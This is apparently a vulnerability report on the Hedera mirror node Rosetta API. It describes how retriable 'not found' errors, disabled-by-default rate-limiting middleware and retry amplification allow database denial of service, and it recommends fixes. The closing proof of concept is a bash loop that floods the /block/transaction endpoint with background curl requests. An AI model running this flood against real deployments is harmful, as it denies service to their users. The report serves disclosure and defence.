### Title
Unauthenticated Tight-Loop Transaction Polling Causes Database DoS via Retriable Error Amplification

### Summary
`ErrTransactionNotFound` (code 119, `retriable=true`) is returned for any transaction hash not yet indexed, with no application-level rate limiting in the Go service itself. The Traefik middleware chain that provides the only rate-limiting defense is **disabled by default** (`global.middleware: false`). When the middleware is enabled, the configured `retry` middleware (attempts: 3) amplifies every retriable 5xx response into 4 database queries, and the rate limit is scoped per `requestHost` (not per source IP), making it trivially bypassable. An unprivileged attacker can flood the `/block/transaction` endpoint with fabricated or real transaction hashes in a tight loop, driving unbounded raw SQL joins against the mirror node database.

### Finding Description

**Code path — error definition:**
`rosetta/app/errors/errors.go:78`
```go
ErrTransactionNotFound = newError(TransactionNotFound, 119, true)  // retriable=true
```
The `retriable=true` flag is a Rosetta-spec signal to clients that the request *should* be retried. Rosetta errors are serialized and returned as HTTP 500 responses.

**Code path — DB query on every miss:**
`rosetta/app/persistence/transaction.go:188-199`
```go
if err = db.Raw(
    selectTransactionsByHashInTimestampRange,
    sql.Named("hash", transactionHash),
    sql.Named("start", consensusStart),
    sql.Named("end", consensusEnd),
).Find(&transactions).Error; err != nil { ... }

if len(transactions) == 0 {
    return nil, hErrors.ErrTransactionNotFound
}
```
`selectTransactionsByHashInTimestampRange` is a multi-table correlated subquery joining `transaction`, `crypto_transfer`, and `staking_reward_transfer`. Every miss executes this full query with no negative-result cache.

**Root cause — middleware disabled by default:**
`charts/hedera-mirror-rosetta/templates/middleware.yaml:3`
```
{{ if and .Values.global.middleware .Values.middleware -}}
```
`charts/hedera-mirror-rosetta/values.yaml:95`
```yaml
global:
  middleware: false   # ← gate is OFF by default
```
The entire Traefik middleware chain (circuit breaker, in-flight limiter, rate limiter, retry) is **not deployed** in a default installation.

**Existing check — rate limit is per requestHost, not per IP (when middleware IS enabled):**
`charts/hedera-mirror-rosetta/values.yaml:157-160`
```yaml
- rateLimit:
    average: 10
    sourceCriterion:
      requestHost: true   # ← shared bucket for ALL clients to same host
```
This is a global 10 req/s cap shared across every caller, not a per-IP limit. A single attacker saturates the entire service's allowance.

**Retry amplification (when middleware IS enabled):**
`charts/hedera-mirror-rosetta/values.yaml:161-163`
```yaml
- retry:
    attempts: 3
    initialInterval: 100ms
```
Traefik retries any HTTP 5xx response. Because `ErrTransactionNotFound` is returned as HTTP 500, each client request for a missing transaction triggers **4 database queries** (1 original + 3 retries) before the client sees the error.

### Impact Explanation
Without the middleware (default deployment): zero rate limiting exists at any layer. An attacker can issue thousands of `/block/transaction` requests per second, each executing a correlated multi-table SQL join, until the database connection pool is exhausted or query latency degrades for all users. With the middleware enabled: the retry amplification (4× DB queries per request) combined with the per-host (not per-IP) rate limit means a single attacker with 5 concurrent connections (the `inFlightReq` limit) generates 20 DB queries per second while consuming the entire 10 req/s host-level budget, denying service to all legitimate users. The `retriable=true` flag additionally encourages automated Rosetta clients and SDK wrappers to loop indefinitely, compounding the load.

### Likelihood Explanation
No credentials, account, or special network position are required. The attacker only needs HTTP access to the Rosetta port. Transaction hashes can be fabricated (any 32-byte hex string) — no actual transaction submission is needed. The attack is trivially scriptable with `curl` or any HTTP client in a loop. Default deployments (the majority, given `global.middleware: false`) have no protection whatsoever.

### Recommendation
1. **Add application-level rate limiting** inside the Go service (e.g., `golang.org/x/time/rate` per-IP token bucket) so protection is not deployment-dependent.
2. **Cache negative results** for `FindByHashInBlock` with a short TTL (e.g., 2–5 seconds) to avoid repeated DB hits for the same hash.
3. **Change the default** of `global.middleware` to `true`, or document clearly that the middleware must be enabled for production.
4. **Change `rateLimit.sourceCriterion`** from `requestHost: true` to `ipStrategy` (per-IP) so individual attackers are throttled independently of legitimate users.
5. **Consider `retriable: false`** for `ErrTransactionNotFound` or add a minimum backoff hint, since the current `retriable=true` with no delay guidance encourages tight-loop retries by conforming clients.

### Proof of Concept
```bash
# No credentials needed. Fabricate a transaction hash (any 32-byte hex).
HASH="0x$(python3 -c 'import os; print(os.urandom(32).hex())')"

# Identify a valid block index/hash first (public endpoint, no auth):
BLOCK=$(curl -s -X POST http://<rosetta-host>/block \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},"block_identifier":{"index":1}}')

BLOCK_INDEX=$(echo $BLOCK | jq '.block.block_identifier.index')
BLOCK_HASH=$(echo $BLOCK | jq -r '.block.block_identifier.hash')

# Tight-loop query for a non-existent transaction — each call hits the DB:
while true; do
  curl -s -o /dev/null -X POST http://<rosetta-host>/block/transaction \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
         \"block_identifier\":{\"index\":$BLOCK_INDEX,\"hash\":\"$BLOCK_HASH\"},
         \"transaction_identifier\":{\"hash\":\"$HASH\"}}" &
done
# With default deployment (no middleware): unlimited DB queries.
# With middleware enabled: each of the 5 allowed concurrent requests
# triggers 4 DB queries via Traefik retry = 20 DB queries/s per attacker IP,
# while consuming the entire 10 req/s host-level rate limit budget.
```
